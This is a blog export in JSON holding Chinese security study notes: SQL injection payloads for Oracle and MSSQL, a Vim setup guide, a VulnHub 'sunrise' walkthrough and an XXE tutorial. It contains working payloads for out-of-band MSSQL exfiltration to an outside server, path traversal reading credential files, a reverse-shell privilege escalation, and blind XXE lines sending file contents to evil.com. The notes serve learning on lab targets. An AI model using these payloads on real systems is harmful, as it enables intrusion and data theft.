{"meta":{"title":"Hu5k7's Blog","subtitle":null,"description":null,"author":"Hu5k7","url":"https://hu5k7.github.io","root":"/"},"pages":[{"title":"About Me","date":"2020-02-19T13:43:57.171Z","updated":"2020-02-19T13:43:57.171Z","comments":false,"path":"about/index.html","permalink":"https://hu5k7.github.io/about/index.html","excerpt":"","text":"Im a Cyberspace-security noob,but i love it, enjoy it. Still learning I come from zkaq-team. hu5k7"},{"title":"tags","date":"2020-02-19T17:17:27.000Z","updated":"2020-02-19T09:17:27.545Z","comments":true,"path":"tags/index.html","permalink":"https://hu5k7.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Oracle Injection","slug":"Oracle注入","date":"2020-02-19T19:57:37.000Z","updated":"2020-02-19T12:54:04.551Z","comments":true,"path":"2020/02/20/Oracle注入/","link":"","permalink":"https://hu5k7.github.io/2020/02/20/Oracle注入/","excerpt":"","text":"0x01 显错注入🔥 所用到的语句 and 1=ctxsys.drithsx.sn(1,(payload)) table_name&lt;&gt;‘ADMIN’ //&lt;&gt;意思是 不等于。也就是排除 and 1=ctxsys.drithsx.sn(1,(select table_name from user_tables from rownum=1)) ⏫rownum指，限制输出只输出一个。查询表 and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=‘ADMIN’ and rownum=1))","categories":[],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"MSSQL Injection","slug":"MSSQL注入","date":"2020-02-19T19:57:29.000Z","updated":"2020-02-19T13:13:59.471Z","comments":true,"path":"2020/02/20/MSSQL注入/","link":"","permalink":"https://hu5k7.github.io/2020/02/20/MSSQL注入/","excerpt":"","text":"0x01 显错注入🔥 union all select db_name() //查询当前库名 union all select null,null,null from dbo.sysobjects //查询表 union all select null,null,null from dbo.syscolumns //查询字段 ?id=1 union all select id,name,null from dbo.sysobjects where xtype=‘U’ ⏫id 和 name 是系统自带的字段名。查询完需要记住，你要查询的表ID。xtype='U’是指用户创建的表 ?id=1 union all select null,name,null from dbo.syscolumns where id=xxxxxx ⏫ null是指3个字段。mssql里的字符串类型管理严格，有可能一个是int类型。或者str类型等。 ?id=1 union all select null,password,null from admin 0x02 MSSQL 反弹注入🎈 前言: 这个是一个比较骚的操作。针对无回显注入点的时候。 0x02.1 反弹注入原理 ☂️MSSQL注射攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖的攻击思路，而反弹注入技术需要依靠opendatasource函数支持 0x02.2 反弹注入条件 🌐需要一台外网主机，字段要相同 复现 Payload🔫 insert into opendatasource(‘sqloledb’,‘server=IP,1433;uid=USERNAME;pwd=PASSWORD;database=DATABASE’).DATABASE.dbo.TABLES select *from admin 句子理解 opendatasource(‘sqloledb’,‘server=IP,1433;uid=USERNAME;pwd=PASSWORD;database=DATABASE’).DATABASE.dbo.TABLES select *from admin 建立temp表4个字段 create table temp(a varchar(255), b varchar(255),c varchar(255),d varchar(255)) 插入语句后查询","categories":[],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"vim-vundle安装和配置","slug":"vim-vundle安装和配置","date":"2019-12-15T15:53:01.000Z","updated":"2019-12-15T08:45:43.465Z","comments":true,"path":"2019/12/15/vim-vundle安装和配置/","link":"","permalink":"https://hu5k7.github.io/2019/12/15/vim-vundle安装和配置/","excerpt":"","text":"0x00 前言 想在pycharm使用 pwntools 但是 pwntools不支持windows。只能跑到Linux搞，但是Vim没有补全于是打算装个 补全插件。顺便写个笔记 环境：Kali 0x01 Vundle插件管理安装 我用的是kali和普通安装有些不同。 第一步 git： 1git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim 在 用户 下建立.vimrc文件 例子： user: /user/.vimrc root: /root/.vimrc 写上以下的句子 1234567891011121314set nocompatible \" be iMproved, requiredfiletype off \" required\" set the runtime path to include Vundle and initializeset rtp+=~/.vim/bundle/Vundle.vimcall vundle#begin()Plugin 'VundleVim/Vundle.vim'Plugin 'tpope/vim-fugitive'Plugin 'L9'call vundle#end() \" requiredfiletype plugin indent on \" required 打开VIM 直接打开不用配合其他文件什么的。 输入 :PluginInstall。安装完后更新一下 :PluginUpdate 等显示Done！的字的时候就代表的 安装/更新 成功 12345call vundle#begin()''' #插件名称位置call vundle#end() 如果我这里不详细，可以去github看原版的档案 地址：https://github.com/VundleVim/ 0x02 vim安装molokai配色方案 我安装完插件后，字体没了颜色。我也没看出问题所在。字体颜色脚本都没有加载。所以我打算直接使用vim的插件。不使用自带的颜色脚本 直接git 下来 1git clone https://github.com/tomasr/molokai.git 然后 mv molokai/ /usr/share/(你的vim版本)/colors/ 下。 并在.vimrc文件 后面加上 123456colorsheme molokailet g:molokai_original=1set t_Co=256set background=draksyntax onset nu! 保存并退出。过会就会生效了。","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"},{"name":"vim","slug":"Note/vim","permalink":"https://hu5k7.github.io/categories/Note/vim/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"},{"name":"vim","slug":"vim","permalink":"https://hu5k7.github.io/tags/vim/"}]},{"title":"vulnhub靶机_sunrise","slug":"vulnhub靶机-sunrise","date":"2019-12-14T18:55:03.000Z","updated":"2019-12-15T06:59:16.510Z","comments":true,"path":"2019/12/15/vulnhub靶机-sunrise/","link":"","permalink":"https://hu5k7.github.io/2019/12/15/vulnhub靶机-sunrise/","excerpt":"","text":"0x00 前言 前几天逛了一下vulnhub,看到比较适合新手的靶机。就下载下来玩玩。 可没想到一个坑，坑了我两天半，共用计两天半。 有句话我想讲一下 **************************!!! 0x01 Sunrise 靶机地址: https://download.vulnhub.com/sunset/sunrise.7z 作者: whitecr0wz 难度: Beginner(新手) 0x01.1 信息收集 nmap -n -T4 172.16.123.109 -A 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 19:05 CSTStats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 7.00% done; ETC: 19:05 (0:00:00 remaining)Nmap scan report for 172.16.123.109Host is up (0.00011s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)| ssh-hostkey:| 2048 37:dd:45:a2:9b:e7:bf:aa:30:e3:f0:96:ac:7c:0b:7c (RSA)| 256 b4:c2:9b:4d:6f:86:67:02:cf:f6:43:8b:e2:64:ea:04 (ECDSA)|_ 256 cb:f2:e6:cd:e3:e1:0f:bf:ce:e0:a2:3b:84:ae:97:74 (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))| http-ls: Volume /| SIZE TIME FILENAME| 612 2019-11-25 05:35 index.nginx-debian.html|_|_http-server-header: Apache/2.4.38 (Debian)|_http-title: Index of /3306/tcp open mysql?| fingerprint-strings:| NULL, RPCCheck:|_ Host '172.16.123.230' is not allowed to connect to this MariaDB server8080/tcp open http-proxy Weborf (GNU/Linux)| fingerprint-strings:| FourOhFourRequest:| HTTP/1.1 404 Page not found: Weborf (GNU/Linux)| Content-Length: 202| Content-Type: text/html| &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;H1&gt;Error 404&lt;/H1&gt;Page not found &lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;| GetRequest:| HTTP/1.1 200| Server: Weborf (GNU/Linux)| Content-Length: 326| &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Size&lt;/td&gt;&lt;/tr&gt;&lt;tr style=\"background-color: #DFDFDF;\"&gt;&lt;td&gt;d&lt;/td&gt;&lt;td&gt;&lt;a href=\"html/\"&gt;html/&lt;/a&gt;&lt;/td&gt;&lt;td&gt;-&lt;/td&gt;&lt;/tr&gt;| &lt;/table&gt;&lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;| HTTPOptions, RTSPRequest, SIPOptions:| HTTP/1.1 200| Server: Weborf (GNU/Linux)| Allow: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE| DAV: 1,2| DAV: &lt;http://apache.org/dav/propset/fs/1&gt;| MS-Author-Via: DAV| Socks5:| HTTP/1.1 400 Bad request: Weborf (GNU/Linux)| Content-Length: 199| Content-Type: text/html|_ &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;H1&gt;Error 400&lt;/H1&gt;Bad request &lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;| http-methods:|_ Potentially risky methods: PUT DELETE PROPFIND MKCOL COPY MOVE|_http-server-header: Weborf (GNU/Linux)|_http-title: Weborf| http-webdav-scan:| Allowed Methods: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE| WebDAV type: Apache DAV|_ Server Type: Weborf (GNU/Linux)2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port3306-TCP:V=7.80%I=7%D=12/14%Time=5DF4C1F5%P=x86_64-pc-linux-gnu%r(NSF:ULL,4D,\"I\\0\\0\\x01\\xffj\\x04Host\\x20'172\\.16\\.123\\.230'\\x20is\\x20not\\x20aSF:llowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(RPCCheckSF:,4D,\"I\\0\\0\\x01\\xffj\\x04Host\\x20'172\\.16\\.123\\.230'\\x20is\\x20not\\x20alloSF:wed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\");==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port8080-TCP:V=7.80%I=7%D=12/14%Time=5DF4C1FA%P=x86_64-pc-linux-gnu%r(GSF:etRequest,187,\"HTTP/1\\.1\\x20200\\r\\nServer:\\x20Weborf\\x20\\(GNU/Linux\\)\\rSF:\\nContent-Length:\\x20326\\r\\n\\r\\n&lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\"-//W3CSF://DTD\\x20HTML\\x204\\.01\\x20Transitional//EN\\\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;SF:/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Size&lt;/td&gt;&lt;/tr&gt;SF:&lt;tr\\x20style=\\\"background-color:\\x20#DFDFDF;\\\"&gt;&lt;td&gt;d&lt;/td&gt;&lt;td&gt;&lt;a\\x20hrefSF:=\\\"html/\\\"&gt;html/&lt;/a&gt;&lt;/td&gt;&lt;td&gt;-&lt;/td&gt;&lt;/tr&gt;\\n&lt;/table&gt;&lt;p&gt;Generated\\x20by\\x2SF:0Weborf/0\\.12\\.2\\x20\\(GNU/Linux\\)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\")%r(HTTPOptions,B2,SF:\"HTTP/1\\.1\\x20200\\r\\nServer:\\x20Weborf\\x20\\(GNU/Linux\\)\\r\\nAllow:\\x20GESF:T,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE\\r\\nDAV:\\x201,2\\r\\nDASF:V:\\x20&lt;http://apache\\.org/dav/propset/fs/1&gt;\\r\\nMS-Author-Via:\\x20DAV\\r\\SF:n\\r\\n\")%r(RTSPRequest,B2,\"HTTP/1\\.1\\x20200\\r\\nServer:\\x20Weborf\\x20\\(GNSF:U/Linux\\)\\r\\nAllow:\\x20GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,SF:MOVE\\r\\nDAV:\\x201,2\\r\\nDAV:\\x20&lt;http://apache\\.org/dav/propset/fs/1&gt;\\r\\SF:nMS-Author-Via:\\x20DAV\\r\\n\\r\\n\")%r(FourOhFourRequest,12B,\"HTTP/1\\.1\\x20SF:404\\x20Page\\x20not\\x20found:\\x20Weborf\\x20\\(GNU/Linux\\)\\r\\nContent-LengSF:th:\\x20202\\r\\nContent-Type:\\x20text/html\\r\\n\\r\\n&lt;!DOCTYPE\\x20HTML\\x20PUSF:BLIC\\x20\\\"-//W3C//DTD\\x20HTML\\x204\\.01\\x20Transitional//EN\\\"&gt;&lt;html&gt;&lt;heaSF:d&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt;\\x20&lt;H1&gt;Error\\x20404&lt;/H1&gt;Page\\x20noSF:t\\x20found\\x20&lt;p&gt;Generated\\x20by\\x20Weborf/0\\.12\\.2\\x20\\(GNU/Linux\\)&lt;/pSF:&gt;&lt;/body&gt;&lt;/html&gt;\")%r(Socks5,125,\"HTTP/1\\.1\\x20400\\x20Bad\\x20request:\\x20SF:Weborf\\x20\\(GNU/Linux\\)\\r\\nContent-Length:\\x20199\\r\\nContent-Type:\\x20tSF:ext/html\\r\\n\\r\\n&lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\"-//W3C//DTD\\x20HTML\\x2SF:04\\.01\\x20Transitional//EN\\\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;bSF:ody&gt;\\x20&lt;H1&gt;Error\\x20400&lt;/H1&gt;Bad\\x20request\\x20&lt;p&gt;Generated\\x20by\\x20WeSF:borf/0\\.12\\.2\\x20\\(GNU/Linux\\)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\")%r(SIPOptions,B2,\"HTTSF:P/1\\.1\\x20200\\r\\nServer:\\x20Weborf\\x20\\(GNU/Linux\\)\\r\\nAllow:\\x20GET,POSF:ST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE\\r\\nDAV:\\x201,2\\r\\nDAV:\\xSF:20&lt;http://apache\\.org/dav/propset/fs/1&gt;\\r\\nMS-Author-Via:\\x20DAV\\r\\n\\r\\SF:n\");MAC Address: 00:0C:29:22:ED:7F (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 0.11 ms 172.16.123.109OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 142.97 seconds 开放的端口: ​ 22/tcp ssh openssh 7.9 ​ 80/tcp http apache ​ 3306/tcp mysql? ​ 8080/tcp http-proxy Weborf 80/tcp http 没有任何东西 mysql连不上 看向 8080端口 看了看版本 用searchsploit搜索一下看看有没有漏洞存在 存在目录穿梭 看了看具体payload: 1GET /..%2f..%2f..%2f..%2fetc%2fpasswd 就是把 / 转成 html编码 %2f 成功。 目录穿梭最主要的就是找 敏感文件信息. 看看有没有敏感文件尤其是 历史记录那些，配置文件等 1GET /..%2f..%2f..%2fhome%2f home下存在两个用户,两个用户下存在的文件： sunrise |_user.txt weborf |_weborf源码 注意！这里是短路的路口，user.txt 是一个坑。重点不在这里 想到端口开放了mysql，于是就百度了一下 mysql的敏感文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879/usr/local/app/apache2/conf/httpd.conf #apache2缺省配置文件 /usr/local/apache2/conf/httpd.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #虚拟网站设置 /usr/local/app/php5/lib/php.ini #PHP相关设置 /etc/sysconfig/iptables #从中得到防火墙规则策略 /etc/httpd/conf/httpd.conf #apache配置文件 /etc/rsyncd.conf #同步程序配置文件 /etc/my.cnf #mysql的配置文件 /etc/redhat-release #系统版本 /etc/issue /etc/issue.netetc/passwd #存储操作系统用户信息,该文件为所有用户可见用户名: 密码 : uid : gid :用户描述：主目录：登陆shell密码：x表示暗文,相反为明文uid：userid,”0”为root ID.1-99为系统保留,分配给系统预定义帐号。Linux用户可以分为3类：超级用户（root）、管理用户和普通用户 伪用户（psuedo users） bin #拥有可执行的用户命令文件 sys #拥有系统文件 adm #拥有账户文件 uucp #UUCP使用 Ip #Ip或lpd子系统使用 nobody #NFS使用 audit cron mail usenetgid:字段记录的是用户所属的用户组。对应着/etc/group文件中的一条记录 用户描述：字段记录着用户的一些个人情况，例如用户的真实姓名、电话、地址等 主目录：用户的起始工作目录 登陆shell： 常用shell - sh(BourneShell),csh(CShell),ksh(KornShell),tcsh(TENEX/TOPS-20typeCShell),bash(BourneAgainShell) /bin/sh #默认登录Shell /sbin/nologin #代表用户不能登录 /etc/shadowusername: passwd: lastchg: min: max: warn: inactive: expire: flag登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志口令 - 加密后的用户口令字，13个字符；如果为空/用户没有口令；如含有不属于集合&#123;./0-9A-Za-z&#125;中的字符/用户不能登录最后一次修改时间 - 表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不同最小时间间隔 - 两次修改口令之间所需的最小天数最大时间间隔 - 口令保持有效的最大天数警告时间 - 从系统开始警告用户到用户密码正式失效之间的天数不活动时间 - 用户没有登录活动但账号仍能保持有效的最大天数失效时间 - 账号的生存期。保留条目 - 无用字段/etc/group 存储有关本地用户组的信息一个组中可以有多个用户，一个用户也可以属于不同的组。当一个用户同时是多个组中的成员时，在/etc/passwd文件中记录的是登录时所属的默认组用户要访问属于附加组的文件时，必须首先使用newgrp命令使自己成为所要访问的组中的成员1）groupname GID #组名2）password #密码位置3）GID #组ID4）user #组成员 /usr/local/app/php5/lib/php.ini #PHP相关设置/usr/local/app/apache2/conf/extra/httpd-vhosts.conf #虚拟网站设置/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf #linux APACHE虚拟主机配置文件/usr/local/resin-3.0.22/conf/resin.conf #3.0.22的RESIN配置文件/usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHE虚拟主机/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf #linux APACHE虚拟主机配置文件/usr/local/resin-3.0.22/conf/resin.conf #3.0.22的RESIN配置文件/usr/local/resin-pro-3.0.22/conf/resin.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf #APASHE虚拟主机/etc/sysconfig/iptables #查看防火墙策略/root/.mysql_history、/root/.bash_history #Mysql账号密码信息 最后一个**.mysql_history** #mysql账号密码信息 这里写的是/root/用户，就猜想是否存在两个用户里面 1GET /..%2f..%2f..%2fhome%2fweborf%2f.mysql_history 找到 weborf 用户的密码。 使用ssh登入上去 登入成功！！！ 到这一步就可以开始渗透提权了 0x01.2 提权 发现用户的等级不是很高。打算来提权一下 想到之前的mysql有半开放的状态。于是有个猜想。 是不是只允许本地登入mysql，测试了一下 登入成功！ 查询了一番数据库发现存在另一个用户的密码。 现在得到了 另一个用户的 密码。 现在切换用户 发现权限也不是特别高。不过算是进入了正常的用户了。 开始提权 1sudo su 测试了一下，发现不行 在百思不得其解的时候。去问了问一些大佬。 有个大佬跟我说看看有没有 wine，可以用wine 建立反向连接。再用sudo -l 查一下该用户有那些权限 存在。 1sudo -l #显示出自己（执行 sudo 的使用者）的权限 scp 传了下msfveom windows 反向连接 scp muma.exe sunrise@172.16.123.109:/home/sunrise/muma.exe 开始反弹。 0x01.3 查看flag 试试是否能直接读取root.txt 1cat /root/root.txt 成功！","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"},{"name":"vulnhub","slug":"Note/vulnhub","permalink":"https://hu5k7.github.io/categories/Note/vulnhub/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"},{"name":"vulnhub","slug":"vulnhub","permalink":"https://hu5k7.github.io/tags/vulnhub/"}]},{"title":"XXE漏洞学习","slug":"xxe","date":"2019-12-03T09:23:08.000Z","updated":"2019-12-08T02:09:47.578Z","comments":true,"path":"2019/12/03/xxe/","link":"","permalink":"https://hu5k7.github.io/2019/12/03/xxe/","excerpt":"","text":"0x00 前言 最近看到挺多XXE漏洞的，于是打算来浅入学习下。 0x01漏洞产生 XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。 XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 0x01.1 XML基础 要了解XXE漏洞，先要搞懂一定的基础知识，了解XML文档的基础组成。 XML 指可扩展标记语言（Extensible Markup Language） 12XML 被设计用来传输和存储数据。HTML 被设计用来显示数据 XML把数据从HTML分离，XML是独立于软件和硬件的信息传输工具。 XML语言没有预定义的标签，允许作者定义自己的标签和自己的文档结构 XML的语法规则： XML文档必须有一个根元素 XML元素都必须有一个关闭标签 XML标签对大小敏感 XML元素必须被正确的嵌套 XML属性值必须加引导 1234567&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!--XML 声明--&gt;&lt;girl age=\"18\"&gt; &lt;!--自定的根元素girl;age属性需要加引导--&gt;&lt;hair&gt;长头发&lt;/hair&gt; &lt;!--自定义的4个子元素，即girl对象的属性--&gt;&lt;eye&gt;大眼睛&lt;/eye&gt;&lt;face&gt;可爱的脸庞&lt;/face&gt;&lt;summary&gt;可爱美丽的女孩&lt;/summary&gt;&lt;/girl&gt; &lt;!--根元素的闭合--&gt; 实体引用 在XML中，一些字符拥有特殊的意义。 如果把字符&quot;&lt;&quot;放在XML元素中，会发生错误，这是因为解释器会把它作为新元素的开始。 例子: 1&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt; 为了避免这个错误，请用实体引用来代替 “&lt;” 字符： 1&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt; 在 XML 中，有 5 个预定义的实体引用： &amp;lt &lt; 小于号 &amp;gt &gt; 大于号 &amp;amp &amp; 和号 &amp;apos ’ 单引号 &amp;quot &quot; 引号 DTD（文档类型定义）的作用是定义XML文档的合法构建模块 DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。 1234567891011121314151617&lt;!--XML声明--&gt;&lt;?xml version=\"1.0\"?&gt; &lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt; 上述XML代码基本分为三个部分： 第一部分是XML的声明； 第二部分是XML的DTD文档类型定义 第三部分是XML语句 而外部实体攻击主要利用DTD的外部实体来进行注入的。 DTD有两种构建方式，分别为内部DTD声明和外部DTD声明 ​ tips: DTD = Document Type Definition 简称 内部DTD声明： 1&lt;!DOCTYPE 根元素 [元素声明]&gt; 实例：如上述代码 外部DTD声明： 1&lt;!DOCTYPE 根元素 SYSTEM \"文件名\"&gt; 实例： 12345678&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root-element SYSTEM \"test.dtd\"&gt;&lt;note&gt;&lt;to&gt;Y&lt;/to&gt;&lt;from&gt;K&lt;/from&gt;&lt;head&gt;J&lt;/head&gt;&lt;body&gt;ESHLkangi&lt;/body&gt;&lt;/note&gt; 0x02 XML简单用法 1&lt;!ENTITY 实体名称 \"实体的值\"&gt; 外部实体: 1&lt;!ENTITY 实体名称 SYSTEM \"URI\"&gt; 参数实体: 1&lt;!ENTITY % 实体名称 \"实体的值\"&gt; 或者 1&lt;!ENTITY % 实体名称 SYSTEM \"URI\"&gt; 实列演示: 除参数实体外实体+内部实体 123456&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY name \"nMask\"&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;name;&lt;/value&gt;&lt;/foo&gt; 实列演示: 参数实体+外部实体 12345&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY % name SYSTEM \"file:///etc/passwd\"&gt; %name;]&gt; 注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。 由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。 外部实体 外部实体即在DTD中使用 1&lt;!ENTITY 实体名称 SYSTEM \"URI\"&gt; 实例演示： 123456&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE a[ //定义一个外部名称 &lt;!ENTITY content SYSTEM \"file:///etc/passwd\"&gt;]&gt; //SYSTEM \"file:///xxxx\" 用于读取文件&lt;foo&gt; &lt;value&gt;&amp;content;&lt;/value&gt;&lt;/foo&gt; 得带Content-Type: application/xml头， 如果请求头类似于：Content-Type: application/json， 那么可以改为Content-Type: application/xml试试有没有xml漏洞 0x03 XXE漏洞实战 题目地址：web.jarvisoj.com:9882 我们抓包看一下 现在我们尝试把 Content-Type: application/json 改成 application/xml 发送以下内容探测是否存在XXE 1234567&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE TEST [ &lt;!ENTITY xxe \"XXE TEST\"&gt; //XXE Test是输出的内容 xxe可以为理解为一个变量 ]&gt;&lt;foo&gt; //乱取个名就好 &amp;xxe; //理解为引用变量地址输出&lt;/foo&gt; 读取文件测试 读取flag测试 0x03.1 下面列出其他的用法 XML文档是用PHP进行解析的，那么还可以使用php:*//filter协议来进行读取。 123&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY content SYSTEM \"php://filter/resource=c:/windows/win.ini\"&gt; ]&gt; &lt;root&gt;&lt;foo&gt;&amp;content;&lt;/foo&gt;&lt;/root&gt; 端口扫描 加载外部DTD时有两种加载方式，一种为私有private，第二种为公共public。 私有类型DTD加载： 1&lt;!ENTITY private_dtd SYSTEM \"DTD_location\"&gt; 公共类型DTD加载： 1&lt;!ENTITY public_dtd PUBLIC \"DTD_name\" \"DTD_location\"&gt; 在公共类型DTD加载的时候，首先会使用DTD_name来检索，如果无法找到，则通过DTD_location来寻找此公共DTD。利用DTD_location，在一定的环境下可以用来做内网探测。 12345&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY portscan SYSTEM \"http://localhost:3389\"&gt;]&gt;&lt;root&gt;&lt;foo&gt;&amp;portscan;&lt;/foo&gt;&lt;/root&gt; blind xxe漏洞: 对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。 利用DTD进行数据回显 有时读取文件时没有回显，这时可以利用DTD参数实体的特性将文件内容拼接到url中，达到读取文件的效果。 1234567891011&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE root[ &lt;!ENTITY % file SYSTEM \"php://fileter/convert.base64-encode/resource=c:/windows/win.ini\"&gt; &lt;!ENTITY % dtd SYSTEM \"http://192.168.1.100:8000/evil.dtd\"&gt; %dtd; %send;]&gt; &lt;root&gt;&lt;/root&gt;evil.dtd &lt;!ENTITY % payload \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://evil.com/?content=%file;'&gt;\"&gt;%payload; 在evil.dtd中将%file实体的内容拼接到url后，然后利用burp等工具，查看url请求就能获得我们需要的内容 0x04 参考链接 我个人认为讲的最好的链接： http://xz.aliyun.com/t/6887 https://www.freebuf.com/articles/web/177979.html https://www.cnblogs.com/vincebye/p/7199290.html https://www.jianshu.com/p/ec2888780308 https://www.cnblogs.com/ESHLkangi/p/9245404.html 